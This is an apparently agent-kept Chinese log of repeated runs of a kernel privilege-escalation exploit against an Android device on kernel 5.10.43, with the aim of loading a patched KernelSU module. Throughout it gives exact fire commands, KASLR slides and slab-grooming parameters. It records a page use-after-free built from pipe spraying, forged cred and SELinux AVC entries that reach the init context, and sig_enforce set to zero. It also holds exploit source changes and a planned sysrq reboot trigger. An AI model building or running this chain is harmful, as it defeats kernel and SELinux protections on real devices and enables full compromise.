+        烘焙 0x22f9c00000→0x1da6400000 patched=188；设备侧 md5=9cdcf6ba48fd959cb313d58da5e7490e
+
+[a19 执行记录 + 新故障] 2026-11-05 23:5x~2026-11-06 00:0x（跳过 observer，未 panic，但设备失去可操作性）
+  boot_id: 1132434d-bc6f-450f-bdc3-78d3a4550d83（a18 panic 后自动重启产生）
+  slide=0x1da6400000 base=0xffffffddb6400000（raw_values=3 hits=3）
+  开火前: posix_timers_cache 180/180 slabdata 6
+  模块: kk18s.ko = kk18_base2 + ksu_observer_init 改写 mov w0,#0; ret
+        本地 md5=5f2e5a61201957ad2e8671d8b1d550a4
+        烘焙 0x22f9c00000→0x1da6400000 patched=188 delta=0xfffffffaac800000
+        设备侧 md5=9cdcf6ba48fd959cb313d58da5e7490e
+  开火: wr93_pprev8 -I -U FCIMP -m kk18s.ko -t -W -s 0x1da6400000 -n 631 -p 60 -g 8 -y 1200 -a 2
+  现象（约 80s 后）:
+    adb devices → 192.168.86.1:5555 device（adbd 在线，TCP 正常）
+    adb shell 任意命令 → error: exec '/system/bin/sh' failed: Function not implemented（ENOSYS）
+    adb pull /proc/modules、/data/local/tmp/a19.log → failed to stat remote object: Input/output error（EIO）
+    adb reboot → 同样 ENOSYS，无法从主机侧重启
+    内核未 panic（无自动重启，uptime 连续增长），a19.log 无法取出
+  判读: kernelsu_init 已越过 ksu_observer_init（跳过生效），继续执行到 ksu_file_wrapper_init 及其后；
+        该内核 5.10.43 的 file / anon_inode 相关结构与模块假设不匹配，把 exec 与文件访问路径打坏，
+        导致 adbd 仍可连接但无法 fork/exec，文件服务 stat 失败
+  处置: 生成 kk18s2.ko = kk18_base2 + 跳过 ksu_observer_init + ksu_file_wrapper_init（两处均 mov w0,#0; ret）
+        本地 md5=9616ff49945243546a0e57917fa4d496（未烘焙，3534080 B）
+        反汇编复核：ksu_file_wrapper_init(.init.text,val=0x630,size=0x7c) 首 8B = 00008052c0035fd6
+                    ksu_observer_init(.text,val=0x6370,size=0x144) 首 8B = 00008052c0035fd6
+        准备脚本: D:\98260\src\a20_fire.sh（从 /data/local/tmp/cur_slide 读 slide，先 kodelta 烘焙再开火）
+                  D:\98260\src\a20_prep.ps1（一键：上线→等 uptime300→relay→tracing→取 slide→推模块/脚本→sync→开火）
+  状态: 等待用户手动重启；重启后执行 a20_prep.ps1 打 a20
+
+[a20 执行记录] 2026-11-06 00:05~00:25（用户手动重启后开火；命中窗口但 B15 闸门弃用，随后 wr93 卡死）
+  boot_id: 979260b1-fd73-42fb-9aeb-579b9a2e1d74
+  uptime 303 时: posix_timers_cache 180/180 slabdata 6（干净）
+  slide=0x27f5c00000 base=0xffffffe805c00000（raw_values=8 hits=3）
+  模块: kk18s2.ko 烘焙 0x22f9c00000→0x27f5c00000 patched=188 delta=0x4fc000000
+        设备侧 md5=826e8997765c31426d9950304db0c980
+  开火(00:14:38): wr93_pprev8 -I -U FCIMP -m kk18s2.ko -t -W -s 0x27f5c00000
+                -n 631 -p 60 -g 8 -y 1200 -a 2（pid=17911，6 核，vcpu=1）
+  attempt 1/2:
+    [B2h] filler 114 + 27，holes=0
+    [B2] victim=17951 tid=17952 timers=631 holes=0 | recs=631 slabs=22 last_slab=2937322
+    [B2d] groups=22 满30=20；前8组 29:451066 30:3397998 30:298070 30:2051916 30:2561662 ...
+    [B2a] arm_i=58 addr=0xffffff833d96fed0
+    [B2b] slab pfn=3397998 cnt=30 | node=0xff..d96ff58 off=0xf58 target pfn=3397999
+    [B7] slabinfo(pre-go) 930 930 272 30 2 slabdata 31（slabdata 已 >33? 实测 31）
+    [K] de_thread comm='timer-exec' 距 go 1367us → SIGKILL
+    [B8] go+1349us det+18us kill+1367us | zombie in 37429us | ku=-1 | reads=56 opens=77119
+    == WINDOW HIT (attempt 1)
+    [B8b] slabinfo(at-hit) 930 930 272 30 2 slabdata 31
+    [B12F] 伪 cred @0xffffff833d96f100 tsec @0xffffff833d96f1c0（sid 初值 0）
+    [B12A] 伪 avc_node @0xffffff833d96f1f0
+    [B12T] slots=10 skip=5
+    [B12I] off=0xf58 aux=0x400 P=0xffffff833d96f400 Pnode=0xffffff833d96f418
+            Q=0xffffff833d96f580 F=0xffffff833d96f640 misc_list=0xffffffe8091c7860
+    [B12c] pipe#0 F_SETPIPE_SZ=1048576 / F_GETPIPE_SZ=1048576 | pipes=60
+    [B13] round1 pages=2048(2048) 150183us | free(n=1 mt=-1) alloc(node pfn=3397999 n=1 mine=1
+          mine_unmov=1 mt=0 order=0) cum_free=1
+          trace mm_page_free pfn=3397998 order=1 @483.364078s
+          trace mm_page_alloc pfn=3397999 order=0 mt=0 GFP_HIGHUSER @483.405216s
+    [B14] head pfn=3397998 归本进程 alloc=0
+    [B15] GATE=PASS(mine_unmov=1/mine=1/any=1) 但 alloc_round=1 free_cnt=1
+    [SM] B15 GATE_REJECT alloc_round=1 free_cnt=1 (<2/<2) → 丢弃该 victim，不进 reap
+    [SAFE] pid=17911 oom_score_adj=-1000
+  卡死: 00:17 后日志不再增长；00:24:51（uptime 935.67s）复查仍停在同一处，
+        wr93 主进程 17911 + 9 线程存活（Ss/S），未进入 attempt 2，未 panic，boot_id 不变
+  结论: 闸门要求「本轮 free≥2 且 alloc_round≥2」，本次只有 1/1 → 弃用；
+        弃用后的清理/切换尝试 2 阶段卡住（未触发任何新的 probe 输出）
+  状态: 等待用户决定是否重启（按约定，GATE_REJECT 后驻留进程不 kill）
+
+[a21 执行记录] 2026-11-06 00:3x~00:4x（重启后开火；两次尝试均未通过前置闸门）
+  boot_id: d9dc03a6-f290-4f68-99ff-410f71297790（新 boot，重启命令已执行成功）
+  uptime 325 时: posix_timers_cache 180/180 slabdata 6（干净）
+  slide=0x2525c00000 base=0xffffffe535c00000（raw_values=4 hits=3）
+  模块: kk18s2.ko（未烘焙副本重推）烘焙 0x22f9c00000→0x2525c00000
+        patched=188 delta=0x22c000000
+        设备侧 md5=c14a2f49693666e2aa37c0d1f025a8f0
+  开火(约 uptime 400s): wr93_pprev8 -I -U FCIMP -m kk18s2.ko -t -W -s 0x2525c00000
+        -n 631 -p 60 -g 8 -y 1200 -a 2（pid=17015）
+  attempt 1/2: [-] 几何脏 (recs=634/631 满30=17/22 arm_i=58 alias=3) → 弃用，重试
+  attempt 2/2:
+    [B0d] raw pipes=6 (cpu0..5)
+    [B2h] 填充器 pid=17075 造 149 个 timer，holes=0（filler 进程=3）
+    [B2] victim=17076 tid=17077 timers=631 holes=0 | recs=631 slabs=22 last_slab=3032692
+    [B2d] groups=22 满30=21；前 8 组 30:3032624 30:3032140 30:3032142 30:3034072
+          30:3034074 30:3034076 30:3034078 30:3032504
+    [B2a] arm_i=29 addr=0xffffff82e4631ed0
+    [B2b] slab pfn=3032624 cnt=30 | target pfn=3032625
+    [B7] slabinfo(pre-go) 1110 1110 272 30 2 slabdata 37
+    [-] slabdata 闸: 37 > 33 → 弃用该 victim，重试
+  == VERDICT: 2 次尝试全部未拿到 (hit+discard)
+  设备: 未 panic，boot_id 不变（uptime 437s），wr93 驻留（17015 Ss + 多线程）
+  结论: attempt1 因几何脏(alias=3)弃用 → 其 631 timer 残留把 attempt2 的 slabdata 顶到 37，
+        同一 boot 内第二次机会被 slabdata 闸锁死；单 boot 实际只有一次干净射击机会
+  状态: 等待重启（按约定不 kill 驻留进程）
+
+[a22 执行记录] 2026-11-06 00:5x~01:0x（原参数重打，仍被 free_cnt 闸门拦下）
+  boot_id: e08291f9-422b-4573-9bfe-cac74f54a3f1
+  uptime 363 时: posix_timers_cache 180/180 slabdata 6
+  slide=0x1ced000000 base=0xffffffdcfd000000（raw_values=3 hits=3）
+  kk18s2.ko 烘焙 0x22f9c00000→0x1ced000000 patched=188 delta=0xfffffff9f3400000
+  设备侧 md5=1aea08e86984aeff21ffda5a7efe82d2
+  开火: wr93_pprev8 -I -U FCIMP -m kk18s2.ko -t -W -s 0x1ced000000 -n 631 -p 60 -g 8 -y 1200 -a 2
+  == WINDOW HIT (attempt 1)
+  [B13] round1: 2048 页/150019us | free(n=1) alloc(pfn=2674187 n=0 mine=0) cum_free=1
+  [B13] round2: 2048 页/150361us | alloc(pfn=2674187 n=1 mine=1 mine_unmov=1 mt=0 ord=0) cum_free=1
+  [B15] GATE=PASS(mine_unmov=1/mine=1/any=1) | alloc_round=2 free_cnt=1
+  [B15] GATE_REJECT alloc_round=2 free_cnt=1 (<2/<2) → 不进 reap
+  VERDICT: 未拿到；进程驻留（未 panic，boot_id 不变，uptime 479.98s）
+  与成功样本对比（关键差异）:
+    a17e(成功): round1 内两次 free(895.560690 SensorService / 896.216533 v-read, 均 pfn=8495634 order=1)
+               → free_cnt=2，本进程直到 round4 才抢到 → PASS → 进入 kernelsu_init
+    a22(本次):  只有 1 次 free，本进程 round2 就抢到 → free_cnt=1 → REJECT
+  → free_cnt 是决定项：必须等目标 slab 被 discard 两次（第二次通常由别的进程复用该页后再释放）
+  → 三连败(a20/a21/a22)均是抢得太早/几何脏；不是模块问题，模块从未被加载（reap 前就停）
+  下一步候选: 用 GRAB=<ms> 前置「等最后一次 free」再进轮次喷涂（该路径自带 GATE 豁免）
+      依据 wr1.c:4441-4469，GRAB 先等首次 free，再等 qms 静默无新 free，累计进 freecnt，
+      然后仍按每轮 2048 页、命中即停；a17e 的 free#2 距 free#1 约 656ms → 需要 GRAB>=800
+
+[wr93a23 改造 + 编译] 2026-11-06 01:0x（经用户确认改为「抢到后监听」）
+  改动(wr1.c:4651-4674): 删除 `gate && (arund<2 || freecnt<2)` 的 GATE_REJECT，
+    改为：gate 命中后清 trace → 等 800ms → trace_scan(g_head_pfn) 统计新增 mm_page_free(order=1, head pfn)
+      新增 free == 0 → 安全，进 reap
+      新增 free > 0  → 抢早了（会二次 free 踩自己持的 pipe 页），弃用驻留（不 reap）
+    新日志行: [B15w] 抢到后监听 800ms: 新增 free=.. (此前 free_cnt=.., alloc_round=..) → 安全/抢早了
+  编译: NDK r27c aarch64-linux-android31-clang -O2 -static（1 warning: wr1.c:1892 C23 标签后声明）
+  产物: D:\98260\src\wr93a23  md5=A094E4E460C89CE64D1F2FEE2D84BE53  size=2349480
+  校验: 含 "B15w" / "抢到后监听"；不含旧串 "GATE_REJECT alloc_round"
+  开火脚本: D:\98260\src\a23_fire.sh（从 cur_slide 读 slide，先 kodelta 再开火到 a23.log）
+  依据: a22 失败是 free_cnt=1（不是 arund），故只删 arund<2 无效；改为直接测「抢到后是否再被 free」
+
+[a23 执行记录] 2026-11-06 01:2x~01:3x（wr93a23 首次开火；两次均卡在 B2e 几何 / B7 slabdata 闸）
+  boot_id: 6be41b69-2e89-4d4c-b452-df1b657f6000（adb reboot 后新 boot）
+  uptime 138 时基线: posix_timers_cache 180/180 272 30 2 slabdata 6
+  uptime 317 开火前: 同上（未变）
+  slide=0x2507a00000 base=0xffffe517a00000（kaslr raw_values=3 hits=3）
+  kk18s2.ko 由 a23_fire.sh 现场烘焙 0x22f9c00000→0x2507a00000（日志未回显 patched 数，md5 未回显，脚本头两行被 setsid 覆盖？）
+  wr93a23 md5=A094E4E460C89CE64D1F2FEE2D84BE53 size=2349480
+  attempt 1/2 [SM] B1 leak tid=17078 cred=0xffffff82ee8a73c0 recs=2 (轮 1/0 off=0x4)
+    [B2h] filler pid=17116 造 143 timer；pid=17117 造 29 timer；holes=0（filler 进程=2）
+    [B2] victim=17118 tid=17119 timers=631 holes=0 | recs=633 slabs=22 last_slab=3829294
+    [B2d] groups=22 满30=18 | 28:3027098 30:3316750 30:8764844 30:8764846 30:8765084
+          30:8765086 30:8765428 30:8765430
+    [B2a] arm_i=57 = last_idx-1 addr=0xffffff8329c0fed0
+    [B2b] slab pfn=3316750 cnt=30 arm_i=57 | node=0xffffff8329c0ff58 off=0xf58
+          pfn=3316751 head=3316750（目标页=3316751, tail页）
+    [B2c] GFP_KERNEL slab → migratetype=UNMOVABLE(0) order=1；discard 回 free_list[1]；pipe(GFP_HIGHUSER) 可抢
+    [B2e] 记录归属 recs=633 okc=631 多=2 非满组=2 | 28:3027098
+    [-] 几何脏 (recs=633/631 满30=18/22 arm_i=57 alias=2) → 弃用该 victim, 重试
+  attempt 2/2
+    [B2h] filler pid=17129 造 148 timer；holes=0（filler 进程=3）
+    [B2] victim=17132 tid=17133 timers=631 holes=0 | recs=631 slabs=22 last_slab=3141050
+    [B2d] groups=22 满30=21 | 30:3829294 30:8594386 30:8455450 30:8582064
+          30:8762006 30:8762262 30:8762314 30:3970314
+    [B2a] arm_i=29 = last_idx-1 addr=0xffffff83a6e2fed0
+    [B2b] slab pfn=3829294 cnt=30 arm_i=29 | node=0xffffff83a6e2ff58 off=0xf58
+          pfn=3829295 head=3829294（目标页=3829295, tail页）
+    [B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+    [B7] slabinfo(pre-go) 1110 1110 272 30 2 slabdata 37
+    [-] slabdata 闸: slabdata=37 > 33 → 弃用该 victim, 重试
+  == VERDICT: 2 次尝试全部未拿到 (hit+discard)
+  设备: 未 panic，boot_id 不变，uptime 428.68s，wr93a23 驻留
+  关键观察:
+    1) attempt1 的「几何脏」来自 boot 期残留的 2 条非满组记录（28:3027098），不是本次 victim 造成；
+       B2e 以全局 recs==631 为判据 → 只要系统里有任何别处 timer，就必然判脏。
+    2) attempt1 弃用后 631 timer 残留 → attempt2 slabdata 从 22 抬到 37 → 被 33 闸锁死。
+       ⇒ 每 boot 仍只有「第一次 attempt」有机会，而它几乎必被 B2e 判脏。
+    3) 结论: 若不改 B2e 判据（改为只看本 victim 631 条是否连续满组），此路径永远打不响。
+
+[a24 执行记录] 2026-11-06 01:5x~02:0x（wr93a24：B2e 放宽 + B15w 抢到后监听，-a 3）
+  boot_id: c41069e3-8cfe-497a-a81d-699d9361607c（adb reboot 后新 boot）
+  uptime 134 基线: posix_timers_cache 180/180 272 30 2 slabdata 6
+  uptime 316 开火前: 同上（slabdata 6，完全干净）
+  slide=0x25bae00000 base=0xffffe5cae00000（kaslr raw_values=4 hits=3）
+  kk18s2.ko 现场烘焙 0x22f9c00000→0x25bae00000（md5 本应写入 a24.log 首部）
+  wr93a24 md5=32854E9C05C1C39B62C5F71E2DEED859 size=2349480
+  开火: wr93a24 -I -U FCIMP -m kk18s2.ko -t -W -s 0x25bae00000 -n 631 -p 60 -g 8 -y 1200 -a 3
+        开火时刻 uptime≈360s
+  ★结果: 75s 后 adb shell 返回 "exec '/system/bin/sh' failed: Function not implemented"
+         adb pull 返回 "failed to stat remote object: Input/output error"
+         adb reboot 也因同样原因失败（reboot 走 shell）
+         → 与 a19 完全相同的内核态：模块已加载，execve 全线 ENOSYS，文件服务 EIO，无 panic、无重启
+  ★意义: 证明「跳过 ksu_observer_init + ksu_file_wrapper_init」不足以解决 ENOSYS；
+         ENOSYS 的制造者在这两个之外（怀疑为 execve 钩子/security hook 内的结构体 ABI 不匹配），
+         或为 ksu_patch_text / kprobe 安装后的副作用。
+  日志丢失: a24.log 无法读取（exec 与文件服务均不可用），需重启后从 pstore/kmsg 取证
+  处置: adb reboot 不可用（adbd 通过 shell 执行 reboot → ENOSYS），需用户手动断电/长按重启
+
+[a24 ENOSYS 根因分析] 2026-11-06 02:0x（源码比对）
+  已排除: ksu_observer_init / ksu_file_wrapper_init 跳过仍复现 → 不是这两处
+  最可能: KSU 的 syscall dispatcher 机制（kernel/hook/arm64/syscall_hook.c + syscall_hook_manager.c）
+    - execve 被 hooks 时, sys_enter tracepoint 里 syscall_hook_manager 把 current_regs->syscallno
+      改写成 ksu_dispatcher_nr(0x118 处), 原始号保存在 regs[8]
+    - 随后 dispatch 进 ksu_syscall_dispatcher: 校验 regs->syscallno != ksu_dispatcher_nr → -ENOSYS
+      再取 orig_nr=regs[8]; syscall_hooks[orig_nr] 为空或越界 → -ENOSYS
+    - 现象「execve 全线 ENOSYS + 文件服务 EIO」正是被 hook 的 syscall 全部落到 dispatcher 且判失败
+  待证实: 需要 kmsg 里 "dispatcher installed at slot N" / "registered syscall hook for nr=" 之后的首个失败
+  取证方案: pstore(ramoops) 控制台在重启后仍保留 → 重启后读 /sys/fs/pstore 即可看到 kernelsu_init 实际走到哪
+  下一步: 重启 → 读 pstore → 定位到具体 init 子步骤 → 只对那一步做 ABI 修正或跳过
+
+[a24 完整日志复原] 2026-11-06（boot 572a0968 重启后从 /data/local/tmp/a24.log 取回，6592 字节）
+  slide=0x25bae00000 | kodelta patched=188 old=0x22f9c00000 new=0x25bae00000 delta=0x2c1200000
+  kk18s2.ko 烘焙后 md5=0c3f1ed51b9654beb1e46132863e539d（3534080 bytes）
+  参数: pid=17006 ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=60 clock=THREAD spray=pipe
+        attempts=3 force_hit=0 selfverify=0 execpath=/proc/self/exe kill_us=-1
+  [B1] cred records=2 va=0xffffff82e75ae780 | probe_task records=1 va=0xffffff81d160cb00
+       cred delta=0x235c76c0 off=0x4
+  [B6] fillers ready=6 [CDEBFA]
+  ---- attempt 1/3 ----
+  [B2h] filler pid=17044 造 113 timer；pid=17045 造 29 timer；holes=0（filler 进程=2）
+  [B2] victim=17046 tid=17047 timers=631 holes=0 | recs=631 slabs=22 last_slab=1284622
+  [B2d] groups=22 满30=20 | 29:445390 30:1749830 30:2103868 30:2103870 30:1741700
+        30:1741702 30:2204248 30:2204250
+  [B2a] arm_i=58 = last_idx-1 addr=0xffffff81ab347ed0
+  [B2b] slab pfn=1749830 cnt=30 arm_i=58 | node=0xffffff81ab347f58 off=0xf58
+        pfn=1749831 head=1749830（目标页=1749831, tail页）
+  [B2c] GFP_KERNEL → UNMOVABLE(0) order=1；discard 回 free_list[1]；pipe(GFP_HIGHUSER) 同链表
+  [B2e] 原始几何(未删 timer): 631 全保留, tv[58] 为全局最后创建
+        ★此前 a23 同一情形(over=2/alias=2/c30=18)被旧闸弃用；a24 放宽后放行
+  [B7] slabinfo(pre-go) 930 930 272 30 2 slabdata 31（<33 通过）
+  [K] de_thread 完成(comm='timer-exec', 距 go 437us) → 立即 SIGKILL
+  [B8] zombie=Z comm='timer-exec' in 6836us | ku=-1 | reads=64 opens=86859 err=0
+       go+415us det+22us kill+437us
+  ★ WINDOW HIT (attempt 1) — 首次在放宽闸门后命中
+  [B8b] slabinfo(at-hit) 930 930 272 30 2 slabdata 31
+  [B12F] 伪 cred @0xffffff81ab347100 (page+0x100) tsec @0xffffff81ab3471c0 (sid初值0)
+  [B12A] 伪 avc_node @0xffffff81ab3471f0 (page+0x1f0)
+  [B12T] 整页自洽 slots=10 skip=5（每槽 parent=(misc-8)|1 right=Pnode left=0）
+  [B12I] 插入模板 off=0xf58 aux=0x400 P=0xffffff81ab347400 Pnode=0xffffff81ab347418
+         Q=0xffffff81ab347580 F=0xffffff81ab347640 misc_list=0xffffffe5ce3c7860
+  [B12c] pipe#0 F_SETPIPE_SZ ret=1048576 F_GETPIPE_SZ=1048576；pipes=60（每 pipe 256 页）
+  [B13] round1 pages=2048 in 152777us | free(n=2 mt=-1) alloc(node pfn=1749831 n=0) cum_free=2
+        trace: pfn=1749830 order=1 @373.240678 与 @373.959380（进程 13 / 17117）
+        round2 pages=2048 in 150030us | free=0 alloc n=0
+        round3 pages=2048 in 150040us | free=0 alloc n=0
+        round4 pages=2048 in 150036us | free=0 alloc(node pfn=1749831 n=1 mine=1 mine_unmov=1
+               mt=0 order=0) cum_free=2
+        trace: mm_page_alloc pfn=1749831 order=0 migratetype=0 GFP_HIGHUSER|... @374.997523
+  [B14] head pfn=1749830 归本进程 alloc=0（仅参考）
+  [B15] GATE=PASS (mine_unmov=1 mine=1 any=1) | alloc_round=4 free_cnt=2
+  [B15w] 抢到后 800ms 监听: extra_free=0 prev_free=2 arund=4 → 安全
+  [B16] REAP 17046 → [B17] reap done status=0x9（写原语执行）
+  [B20] open /dev/uhid → 134 (errno=11)
+  [B21] repair pwrite=128 errno=0
+  [B22] open2 /dev/uhid → 135 (errno=0)
+  == VERDICT: STAGE1 桥就绪（fd*2 命中）
+  [B19] stage1 完成 rc=0
+  [F] fake_cred=0xffffff81ab347100 tsec=0xffffff81ab3471c0
+  [F] sig_enforce(0xffffffe5ce32d468) <- 0 rc=0
+  [F] real_cred/cred -> 0xffffff81ab347100 rc=0
+  [F] 命中 sid=68 -> u:r:init:s0 ★
+  [F] task->pid/tgid(0x878) <- 0 rc=0
+  [F] avc_node key ssid=tsid=68 rc=0；pprev(+0x30)<-0xffffffe5ce7476c8 rc=0
+  [F] avc slots[276] -> fake_list 0xffffff81ab347218 rc=0
+  [A17] const_caps_ready 0xffffffe5ce5fc6bc <- 1 rc=0 | bti key 0xffffffe5ce5fc660 <- 0 rc=0
+  [F] 已放行 probe 调 init_module（kk18s2.ko）
+  [F] +0ms comm='wpAAAAAAABBBBBB' | +3ms 'W0_CALL' | +157ms 'W2_r0_e0' state=R
+  [U] root_probe_patch rc=0；放行 probe 执行 FCIMP
+  [F] module 预读完成 3534080/3534080 bytes
+  → 日志到此截止（之后 execve 全线 ENOSYS，无法再写日志）
+  ★结论: a24 完整走通「窗口命中→抢页→reap→uhid 桥→伪 cred→BTI/avc→init_module 调用」，
+         模块已进入 kernelsu_init；失败点是模块内部，而非载入链
+
+[a24 vs 历史载入链逐步对比]
+  环节                  | a18r4(kk18l)      | a19(kk18_base2)   | a23(wr93a23)      | a24(wr93a24)
+  ----------------------|-------------------|-------------------|-------------------|------------------
+  boot_id               | fc6414b1…         | e08291f9…         | 6be41b69…         | c41069e3…(fire)
+  slide                 | 0x14aa200000      | 0x1da6400000      | 0x2507a00000      | 0x25bae00000
+  kodelta patched       | 188               | 188               | (日志回显缺失)     | 188 ✓
+  B2e 几何闸             | pass              | pass              | attempt1 被弃        | attempt1 pass(放宽后)
+  B7 slabdata           | 通过              | 通过               | 37/38 被拦          | 31 通过
+  窗口命中               | 命中(多轮后)       | 命中               | 0/2 命中            | 1/1 命中(attempt1)
+  reap/uhid 桥           | 完成              | 完成               | 未到               | 完成
+  伪 cred/avc/BTI        | 完成              | 完成               | 未到               | 完成
+  init_module 调用        | 完成→panic        | 完成               | 未到               | 完成
+  kernelsu_init          | 崩于 ksu_mark_running_process_locked+0x80
+                         | 跑过后 exec ENOSYS | —                 | 跑过后 exec ENOSYS
+  系统可用性              | 否(panic)         | 否(ENOSYS)        | 是                | 否(ENOSYS)
+
+[a24 成功率]
+  载入链（窗口命中→reap→桥→伪cred→init_module）: 1/1 = 100%（首次 attempt 即命中）
+  闸门通过率: B2e 1/1, B7 1/1（基线 slabdata=6，起手 930/930=31）
+  模块加载到 kernelsu_init: 1/1 = 100%
+  系统保持可用: 0/1 = 0%（加载后 execve 全线 ENOSYS）
+  ⇒ 瓶颈已从「载入链」彻底转移到「模块内部 ABI」，载入链本身不再需要重试
+
+[a24 ko 问题落盘] 静态反汇编结论（kk18_base2.ko / kk18s2.ko 同源）
+  1) kernelsu_init 调用序（.init.text，符号解析后）:
+     ksu_syscall_hook_init → ... → ksu_register_kernel_hook → ksu_syscall_hook_manager_init
+     → ksu_observer_init(已改 mov w0,#0;ret) → ksu_file_wrapper_init(已改 mov w0,#0;ret)
+     → ksu_boot_completed 分支 → ksu_kernel_umount_init → ksu_sucompat_init
+  2) ksu_syscall_hook_init (0xd0 字节) 实际动作:
+     memset(syscall_hooks,0,0xdc8)
+     ksu_syscall_table = ksu_resolve_symbol_for_functable_hook("sys_call_table")
+     若为空 → printk 报错返回；ksu_find_ni_syscall_slots(&slot,4)
+     ksu_dispatcher_nr = slot
+     ksu_syscall_table_hook(slot, &ksu_syscall_dispatcher, NULL)  ← 把 dispatcher 写进 sys_call_table
+     printk("dispatcher installed at slot %d")
+  3) ksu_syscall_hook_manager_init:
+     tracepoint_probe_register_prio(&__tracepoint_sys_enter, handler, NULL, -0x80000000)
+     失败 → printk err；成功后 ksu_mark_running_process_locked()（此函数曾被修过 9 处偏移）
+  4) ksu_sys_enter_handler（.text 0x50 字节，命中 ENOSYS 的关键）:
+     mrs x8, sp_el0
+     ldr x9, [x8]                  ← current->thread_info.flags（offset 0）
+     tbnz w9,#0x16 → ret           ← TS_COMPAT 位判断
+     ldr w10,[ksu_dispatcher_nr]; tbnz w10,#0x1f → ret
+     cmp w2,#0x1b8 → 有效号范围判断（__NR_syscalls=441）
+     syscall_hooks[id & 0x1ff] 为 0 → ret
+     ldr x8, [x8,#0x20]            ← current->stack（模块用 0x20，本内核 state=0x18 → stack=0x20 ✓）
+     str x2,  [x8,#0x3ef0]         ← PT_REGS_ORIG_SYSCALL = regs[8]
+     str w9,  [x8,#0x3fc8]         ← regs->syscallno = dispatcher_nr
+  5) ★已证实的 ABI 错位:
+     本机 /proc/config.gz: CONFIG_THREAD_INFO_IN_TASK=y, # CONFIG_ARM64_MTE is not set
+     → 本内核 struct pt_regs = 0x140 字节（无 MTE 的 unused 字段）
+     → task_pt_regs 基址 = stack + 0x4000 - 0x140 = stack + 0x3ec0
+        → regs[8] 真值位置 = 0x3f00；syscallno 真值位置 = 0x3ed8? 注意: syscallno 在 0x3ec0+0x118=0x3fd8
+     模块按「有 MTE」编译（0x150）→ 基址 stack+0x3eb0
+        → 写 0x3ef0 = 真 regs[6]（把 syscall 号写进第 7 个参数寄存器）
+        → 写 0x3fc8 = 真 pstate（把 dispatcher 槽号写进 SPSR）
+     ⇒ 结论 A: 重定向实际没生效（syscallno 未被改写），execve 本应正常工作
+  6) ★结论 B（当前更可能，与 ENOSYS 现象吻合）:
+     ksu_syscall_table_hook 把 dispatcher 写进了 sys_call_table 的**某个真实 syscall 槽**
+     （ni 槽扫描/表基址判定与实际不符），execve 直接落进 dispatcher；
+     dispatcher 首条校验 regs->syscallno != ksu_dispatcher_nr → 返回 -ENOSYS
+     ⇒ 「exec '/system/bin/sh' failed: Function not implemented」正是这一条路径
+  7) 两条修复路线:
+     思路1（标准 KSU 行为）: 修 sys_enter 重定向的 pt_regs 偏移
+        - 把 0x3ef0 → 0x3f00，0x3fc8 → 0x3fd8（即按无 MTE 的 pt_regs 0x140 基址）
+        - 同时确认 dispatcher 槽确实只占一个 ni 槽（用 kmsg 里 "dispatcher installed at slot %d" 核对）
+     思路2（保守，不修 hook 逻辑）: 让 ksu_syscall_hook_init 直接返回
+        - 不改表、不装 dispatcher、不装 sys_enter tracepoint → 系统 syscall 完全原生
+        - 代价: KSU 的 execve/open 等 hook 不生效，仅保留 supercall/cred 等非 syscall 能力
+     取证前置（两条路线都要）: a25 开火前先启动后台 dmesg 抓取器
+        `(dmesg -w > /data/local/tmp/a25_kmsg.log 2>&1 &)` —— 该进程在 ENOSYS 后仍可继续写文件
+        并预埋 sysrq 自重启（不依赖 exec）:
+        `(while :; do sleep 1; done) &` 由外部观察者触发 `echo b > /proc/sysrq-trigger`
+        重启后再读 a25_kmsg.log，即可拿到 "dispatcher installed at slot N" 与首个失败点
+
+[a25 准备] 2026-11-06（用户指令：先把链路成功率做到 100%，本次只走到「可加载 ko」为止，不加载 ko）
+  目标: 只验证载入链（窗口命中→抢页→reap→uhid 桥→伪 cred→AVC/BTI→probe 就绪），
+        不唤醒 probe、不调 init_module、不碰 kk ko，系统必须保持可用
+  改动: wr1.c 新增 -k 开关（g_noload）
+        - 在「⑤ 放行 probe」之前拦截: 打印 [F] -k 状态 → for(;;) sleep(60) 驻留
+        - 驻留期间不 close pipe、不释放别名页（防止假节点悬空）
+  二进制: D:\98260\src\wr93a25  size=2349832  md5=1EA6514A2CF0DEFEB9D4A47CF434E5FF
+          已校验二进制内含 -k 标记字符串
+  脚本: D:\98260\src\a25_fire.sh
+        setsid ./wr93a25 -I -U FCIMP -k -t -W -s $S -n 631 -p 60 -g 8 -y 1200 -a 3
+  判据: 日志出现 "[F] -k: 已走到「可加载 ko」状态 … 驻留" = 该次 attempt 链路 100% 成立
+        且加载结束后 adb shell 仍可用（exec 不应出现 ENOSYS）
+  状态: 已编译就绪，等待用户通知后开火
+
+[a25 执行记录 第1枪] 2026-11-06（boot 572a0968，-k 不加载 ko）
+  uptime 1652 基线: posix_timers_cache 180/180 272 30 2 slabdata 6
+  slide=0x21ba000000 base=0xffffffe1ca000000（raw_values=4 hits=3）
+  设备端 wr93a25 md5=1ea6514a2cf0defeb9d4a47cf434e5ff（与主机一致）
+  参数: setsid ./wr93a25 -I -U FCIMP -k -t -W -s 0x21ba000000 -n 631 -p 60 -g 8 -y 1200 -a 3
+  ---- attempt 1/3 ----
+  [B2h] filler pid=31083 造 145 timer；pid=31084 造 29 timer；holes=0（filler=2）
+  [B2] victim=31087 tid=31088 timers=631 holes=0 | recs=633 slabs=22 last_slab=1825618
+  [B2d] groups=22 满30=18 | 28:1712782 30:1804866 30:1806188 30:1806190 30:1774976 30:1774978
+        30:1774980 30:1774982
+  [B2a] arm_i=57 = last_idx-1 addr=0xffffff81b8a43ed0
+  [B2b] slab pfn=1804866 cnt=30 arm_i=57 | node=0xffffff81b8a43f58 off=0xf58
+        pfn=1804867 head=1804866（目标页=1804867）
+  [B2e] recs=633 okc=631 多=2 非满组=2 | 28:1712782 31:1813228!
+  [B2f] 放行: 多出的 2 条仅落在非满组; 目标 pfn=1804866 cnt=30
+  [B7] slabinfo(pre-go) 960 960 272 30 2 slabdata 32（<33 通过）
+  [K] de_thread 完成(comm='timer-exec', 距 go 475us) → 立即 SIGKILL
+  [B8] zombie=Z comm='exe' in 67995us | ku=-1 | reads=63 opens=127626 err=0
+       go+448us det+27us kill+475us
+  → MISS (exec 正常完成)
+  ---- attempt 2/3 ----
+  [B2h] filler pid=31177 造 148 timer；holes=0（filler=3）
+  [B2] victim=31178 tid=31179 timers=631 holes=0 | recs=632 slabs=22 last_slab=2350314
